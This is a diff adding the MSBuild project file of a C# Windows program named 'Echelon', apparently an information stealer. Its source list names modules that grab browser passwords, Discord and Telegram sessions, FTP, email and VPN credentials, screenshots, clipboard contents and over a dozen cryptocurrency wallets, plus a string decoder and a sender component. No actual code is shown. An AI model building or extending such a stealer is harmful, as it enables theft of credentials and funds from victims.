@@ -1,0 +1,225 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{658AC224-561D-4E46-8703-4F2E682B09C7}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Echelon</RootNamespace>
+    <AssemblyName>Echelon</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <TargetFrameworkProfile />
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <UseVSHostingProcess>false</UseVSHostingProcess>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <Prefer32Bit>false</Prefer32Bit>
+    <RunCodeAnalysis>false</RunCodeAnalysis>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject />
+  </PropertyGroup>
+  <PropertyGroup>
+    <TargetZone>Internet</TargetZone>
+  </PropertyGroup>
+  <PropertyGroup>
+    <GenerateManifests>false</GenerateManifests>
+  </PropertyGroup>
+  <PropertyGroup />
+  <PropertyGroup>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>
+    </ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup>
+    <RunPostBuildEvent>Always</RunPostBuildEvent>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="DotNetZip, Version=1.13.7.0, Culture=neutral, PublicKeyToken=6583c7c814667745, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>Resources\DotNetZip.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="netstandard, Version=2.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51" />
+    <Reference Include="PresentationCore" />
+    <Reference Include="System" />
+    <Reference Include="System.configuration" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Data.SqlXml" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http.WebRequest" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Xml" />
+    <Reference Include="UIAutomationClient" />
+    <Reference Include="UIAutomationTypes" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Program.cs" />
+    <Compile Include="Global\DecodStr.cs" />
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+      <DependentUpon>Settings.settings</DependentUpon>
+    </Compile>
+    <Compile Include="Global\GenString.cs" />
+    <Compile Include="Global\Help.cs" />
+    <Compile Include="Global\NativeMethods.cs" />
+    <Compile Include="Global\SenderAPI.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="Stealer\Browsers\Chromium\Chromium.cs" />
+    <Compile Include="Stealer\Browsers\Chromium\DecryptAPI.cs" />
+    <Compile Include="Stealer\Browsers\Chromium\SqlHandler.cs" />
+    <Compile Include="Stealer\Browsers\DomainDetect.cs" />
+    <Compile Include="Stealer\Browsers\Edge\Edge.cs" />
+    <Compile Include="Stealer\Browsers\Edge\VaultCli.cs" />
+    <Compile Include="Stealer\Browsers\Gecko\Gecko1.cs" />
+    <Compile Include="Stealer\Browsers\Gecko\Gecko2.cs" />
+    <Compile Include="Stealer\Browsers\Gecko\Gecko3.cs" />
+    <Compile Include="Stealer\Browsers\Gecko\Gecko4.cs" />
+    <Compile Include="Stealer\Browsers\Gecko\Gecko5.cs" />
+    <Compile Include="Stealer\Browsers\Gecko\Gecko6.cs" />
+    <Compile Include="Stealer\Browsers\Gecko\Gecko7.cs" />
+    <Compile Include="Stealer\Browsers\Gecko\Gecko8.cs" />
+    <Compile Include="Stealer\Browsers\Gecko\Gecko9.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\CNT.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\FF.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\IsNullExtension.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\NoiseMe.Drags.App.Models.JSON\JavaScriptReader.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\NoiseMe.Drags.App.Models.JSON\JsonArray.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\NoiseMe.Drags.App.Models.JSON\JsonExt.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\NoiseMe.Drags.App.Models.JSON\JsonObject.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\NoiseMe.Drags.App.Models.JSON\JsonPrimitive.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\NoiseMe.Drags.App.Models.JSON\JsonType.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\NoiseMe.Drags.App.Models.JSON\JsonValue.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\ROW.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\Steal.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\StringExtension.cs" />
+    <Compile Include="Stealer\Browsers\Helpers\SZ.cs" />
+    <Compile Include="Stealer\Buff\BuffBoard.cs" />
+    <Compile Include="Stealer\Discord\DGrabber.cs" />
+    <Compile Include="Stealer\EmailClients\Outlook.cs" />
+    <Compile Include="Stealer\FileGrabber\Folders.cs" />
+    <Compile Include="Stealer\FileGrabber\GetFiles.cs" />
+    <Compile Include="Stealer\FileGrabber\IFolders.cs" />
+    <Compile Include="Stealer\FTP\FileZilla.cs" />
+    <Compile Include="Stealer\FTP\TotalCommander.cs" />
+    <Compile Include="Stealer\Jabber\Pidgin.cs" />
+    <Compile Include="Stealer\Jabber\Psi.cs" />
+    <Compile Include="Stealer\Jabber\Startjabbers.cs" />
+    <Compile Include="Stealer\Next\Screenshot.cs" />
+    <Compile Include="Stealer\PCinfo\Systemsinfo.cs" />
+    <Compile Include="Stealer\Stealer.cs" />
+    <Compile Include="Stealer\Telegram\TGrabber.cs" />
+    <Compile Include="Stealer\VPN\NordVPN.cs" />
+    <Compile Include="Stealer\VPN\OpenVPN.cs" />
+    <Compile Include="Stealer\VPN\ProtonVPN.cs" />
+    <Compile Include="Stealer\Wallets\Armory.cs" />
+    <Compile Include="Stealer\Wallets\AtomicWallet.cs" />
+    <Compile Include="Stealer\Wallets\BitcoinCore.cs" />
+    <Compile Include="Stealer\Wallets\Bytecoin.cs" />
+    <Compile Include="Stealer\Wallets\DashCore.cs" />
+    <Compile Include="Stealer\Wallets\Electrum.cs" />
+    <Compile Include="Stealer\Wallets\Ethereum.cs" />
+    <Compile Include="Stealer\Wallets\Exodus.cs" />
+    <Compile Include="Stealer\Wallets\Jaxx.cs" />
+    <Compile Include="Stealer\Wallets\LitecoinCore.cs" />
+    <Compile Include="Stealer\Wallets\Monero.cs" />
+    <Compile Include="Stealer\Wallets\StartWallets.cs" />
+    <Compile Include="Stealer\Wallets\Zcash.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <SubType>Designer</SubType>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include=".NETFramework,Version=v4.7.2">
+      <Visible>False</Visible>
+      <ProductName>Microsoft .NET Framework 4.7.2 %28x86 и x64%29</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Domains.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\DotNetZip.dll" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PostBuildEvent>
+    </PostBuildEvent>
+  </PropertyGroup>
+</Project>
